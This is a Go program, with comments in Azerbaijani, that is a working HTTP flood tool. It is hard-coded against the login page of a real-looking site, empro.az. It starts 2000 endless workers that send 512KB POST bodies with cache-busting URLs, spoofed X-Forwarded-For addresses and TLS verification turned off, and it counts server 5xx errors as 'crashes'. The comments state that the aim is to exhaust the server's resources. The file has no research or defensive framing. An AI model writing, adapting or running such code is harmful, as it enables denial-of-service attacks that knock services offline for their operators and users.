package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"strings"
	"sync"
	"time"
)

func main() {
	target := "https://empro.az/#/login"
	workers := 2000 // Railway RAM limitinə görə tənzimlənib

	fmt.Printf("[!!!] HAKAI-DEMON START: %s\n", target)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:        10000,
		MaxIdleConnsPerHost: 5000,
		DisableKeepAlives:   false,
	}

	client := &http.Client{Transport: tr, Timeout: 10 * time.Second}

	var wg sync.WaitGroup
	// 512KB - Serverin resurslarını sarsıtmaq üçün çox ağır payload
	payload := "data=" + strings.Repeat("M", 524288) 

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			for {
				// Cache bypass üçün hər dəfə unikal URL
				u := fmt.Sprintf("%s&bx=%d&t=%d", target, rand.Intn(999999), time.Now().UnixNano())
				
				req, _ := http.NewRequest("POST", u, strings.NewReader(payload))
				
				// Realist Headers
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0")
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
				req.Header.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))

				resp, err := client.Do(req)
				if err == nil {
					if resp.StatusCode >= 500 {
						fmt.Printf("[CRASH-%d] Status: %d\n", id, resp.StatusCode)
					}
					resp.Body.Close()
				}
				// Gecikməni minimuma saxlayırıq
				time.Sleep(1 * time.Millisecond)
			}
		}(i)
	}
	wg.Wait()
}
